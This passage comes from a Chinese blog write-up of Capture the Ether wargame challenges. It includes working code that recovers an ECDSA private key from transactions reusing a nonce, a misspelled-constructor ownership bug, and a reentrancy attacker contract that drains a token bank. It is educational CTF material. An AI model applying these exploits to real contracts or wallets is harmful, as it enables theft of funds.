class="hljs-string">&#x27;ethereumjs-tx&#x27;</span>).Transaction;<br><span class="hljs-keyword">var</span> rawTx1 =<br>    &#123; <span class="hljs-attr">nonce</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">gasPrice</span>: <span class="hljs-string">&#x27;0x3b9aca00&#x27;</span>,<br>        <span class="hljs-attr">gasLimit</span>: <span class="hljs-string">&#x27;0x5208&#x27;</span>,<br>        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;0x1111d67bb1bb0000&#x27;</span>,<br>        <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;0x&#x27;</span>,<br>        <span class="hljs-attr">v</span>: <span class="hljs-number">41</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,<br>        <span class="hljs-attr">s</span>: <span class="hljs-string">&#x27;0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8&#x27;</span><br>    &#125;<br><span class="hljs-keyword">var</span> rawTx2 =<br>    &#123; <span class="hljs-attr">nonce</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">gasPrice</span>: <span class="hljs-string">&#x27;0x3b9aca00&#x27;</span>,<br>        <span class="hljs-attr">gasLimit</span>: <span class="hljs-string">&#x27;0x5208&#x27;</span>,<br>        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;0x1922e95bca330e00&#x27;</span>,<br>        <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;0x&#x27;</span>,<br>        <span class="hljs-attr">v</span>: <span class="hljs-number">41</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,<br>        <span class="hljs-attr">s</span>: <span class="hljs-string">&#x27;0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de&#x27;</span><br>    &#125;<br>tx1 = <span class="hljs-keyword">new</span> EthereumTx(rawTx1,&#123; <span class="hljs-attr">chain</span>: <span class="hljs-string">&#x27;ropsten&#x27;</span>, <span class="hljs-attr">hardfork</span>: <span class="hljs-string">&#x27;petersburg&#x27;</span> &#125;);<br>tx2 = <span class="hljs-keyword">new</span> EthereumTx(rawTx2,&#123; <span class="hljs-attr">chain</span>: <span class="hljs-string">&#x27;ropsten&#x27;</span>, <span class="hljs-attr">hardfork</span>: <span class="hljs-string">&#x27;petersburg&#x27;</span> &#125;);<br><br>z1=tx1.hash(<span class="hljs-literal">false</span>).toString(<span class="hljs-string">&quot;hex&quot;</span>);<br>z2=tx2.hash(<span class="hljs-literal">false</span>).toString(<span class="hljs-string">&quot;hex&quot;</span>);<br><span class="hljs-built_in">console</span>.log(z1);<br><span class="hljs-built_in">console</span>.log(z2);<br></code></pre></td></tr></table></figure>

<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span> = k ^ -<span class="hljs-number">1</span>（<span class="hljs-symbol">z1</span> + dA * r）-k ^ -<span class="hljs-number">1</span>（<span class="hljs-symbol">z2</span>+ dA * r）<br>= k^-<span class="hljs-number">1</span>(<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)<br>k = (<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)/(<span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span>)<br><br>所以私钥 d = (s*k-z)/r<br>= (s*k-z) * inverse_mod(r, p) % p<br><br>k = (<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)/(<span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span>)<br>= (<span class="hljs-symbol">z1</span> – <span class="hljs-symbol">z2</span>)*inverse_mod(<span class="hljs-symbol">s1</span> – <span class="hljs-symbol">s2</span>,p)%p<br></code></pre></td></tr></table></figure>

<p>其中取模反的运算来自于<a target="_blank" rel="noopener" href="https://github.com/warner/python-ecdsa/">python-ecdsa</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_mod</span>(<span class="hljs-params"> a, m </span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Inverse of a mod m.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> m &lt;= a: a = a % m<br>    c, d = a, m<br>    uc, vc, ud, vd = <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> c != <span class="hljs-number">0</span>:<br>        q, c, d = <span class="hljs-built_in">divmod</span>( d, c ) + ( c, )<br>        uc, vc, ud, vd = ud - q*uc, vd - q*vc, uc, vc<br><br>    <span class="hljs-keyword">assert</span> d == <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> ud &gt; <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> ud<br>    <span class="hljs-keyword">else</span>: <span class="hljs-keyword">return</span> ud + m<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">derivate_privkey</span>(<span class="hljs-params">p, r, s1, s2, z1, z2</span>):</span><br>    z = z1 - z2<br>    s = s1 - s2<br>    r_inv = inverse_mod(r, p)<br>    s_inv = inverse_mod(s, p)<br>    k = (z * s_inv) % p<br>    d = (r_inv * (s1 * k - z1)) % p<br>    <span class="hljs-keyword">return</span> d, k<br><br>z1 = <span class="hljs-number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span><br>s1 = <span class="hljs-number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span><br>r = <span class="hljs-number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span><br>z2 = <span class="hljs-number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span><br>s2 = <span class="hljs-number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span><br><br>p  = <span class="hljs-number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;privatekey:%x\n k:%x&quot;</span> % derivate_privkey(p,r,s1,s2,z1,z2))<br></code></pre></td></tr></table></figure>



<h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AssumeOwnershipChallenge &#123;<br>    address owner;<br>    bool public isComplete;<br><br>    function AssumeOwmershipChallenge() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>构造函数拼写错误</p>
<h3 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;<br>    require(balanceOf[msg.sender] &gt;= value);<br><br>    balanceOf[msg.sender] -= value;<br>    balanceOf[to] += value;<br>    emit Transfer(msg.sender, to, value);<br><br>    if (isContract(to)) &#123;<br>        ITokenReceiver(to).tokenFallback(msg.sender, value, data);<br>    &#125;<br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里判断了to地址是否是个合约地址，如果是合约的话就用ITokenReceiver接口来调用to合约的tokenFallback函数，在银行合约里这个函数用更改目标的balance，合约存在重入漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint256 amount) public &#123;<br>    require(balanceOf[msg.sender] &gt;= amount);<br><br>    require(token.transfer(msg.sender, amount));<br>    // balance decreased after recipient is notified<br>    // re-entrancy issue<br>    balanceOf[msg.sender] -= amount;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用该<code>token.transfer</code>函数后余额会更新，允许我们每次重复提取我们的存入资金。重入控制流程将是<code>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; ... </code>。</p>
<p>在调用攻击合约前，先将player账户withdraw出来，再给攻击合约授权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    TokenBankChallenge public challenge;<br><br>    constructor(address challengeAddress) &#123;<br>        challenge = TokenBankChallenge(challengeAddress);<br>    &#125;<br><br>    function deposit() payable &#123;<br>        challenge.token().transferFrom(address(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624),address(this),500000000000000000000000);<br>        challenge.token().transfer(address(challenge),challenge.token().balanceOf(address(this)));<br>    &#125;<br><br>    function attack() payable &#123;<br>        callWithdraw();<br>        require(challenge.isComplete(), &quot;challenge not completed&quot;);<br>    &#125;<br><br>    function tokenFallback(address from, uint256 value, bytes data) external &#123;<br>        callWithdraw();<br>    &#125;<br><br>    function callWithdraw() payable &#123;<br>        uint256 myInitialBalance = 500000000000000000000000;<br>        uint256 challengeTotalRemainingBalance =<br>            challenge.token().balanceOf(address(challenge));<br>        bool keepRecursing = challengeTotalRemainingBalance &gt; 0;<br><br>        if (keepRecursing) &#123;<br>            uint256 toWithdraw =<br>                myInitialBalance &lt; challengeTotalRemainingBalance<br>                    ? myInitialBalance<br>                    : challengeTotalRemainingBalance;<br>            challenge.withdraw(toWithdraw);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/">#靶场刷题</a>
      
        <a href="/tags/Etherum/">#Etherum</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>capture the ether wp</div>
      <div>http://example.com/2022/04/02/capture the ether wp/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>April 2, 2022</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/" title="Damn vulnerable defi v2 wp">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Damn vulnerable defi v2 wp</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/" title="Ethernaut闯关（下）">
                        <span class="hidden-mobile">Ethernaut闯关（下）</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
